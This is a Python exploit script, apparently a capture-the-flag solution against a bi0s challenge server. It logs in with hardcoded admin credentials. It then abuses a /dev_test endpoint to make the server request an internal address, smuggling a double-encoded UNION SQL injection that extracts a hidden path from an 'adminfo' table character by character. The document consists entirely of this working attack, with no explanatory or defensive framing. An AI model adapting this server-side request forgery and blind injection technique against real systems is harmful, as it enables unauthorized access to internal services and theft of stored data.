import requests
import string
url="http://web.challenge.bi0s.in:6006/login"
url2="http://web.challenge.bi0s.in:6006/return-files?f="
url1="http://web.challenge.bi0s.in:6006/dev_test"
def login():
  r = requests.post(url,data={'username':'admin','password':'1337'}, allow_redirects = False)
  newcookie= r.cookies['session']
  return newcookie

dem=0
patt="/admin"
payload=""
newcookie=login()
while 1:
  dem=dem+1
  print(dem)
  for i in "/"+string.ascii_letters + string.digits:
    
    
    data1={"url":"http://192.168.48.2?part1=%252527&part2=path,name from adminfo where path like 0x{}25  Union select password".format((payload+i).encode('utf-8').hex())}
    r =requests.post(url1,data=data1,cookies={"session":""+newcookie})
    #print(r.text)
    

    if "Not" in r.text:
      payload=payload +i
      print("+[flag]= ",payload)
      
      break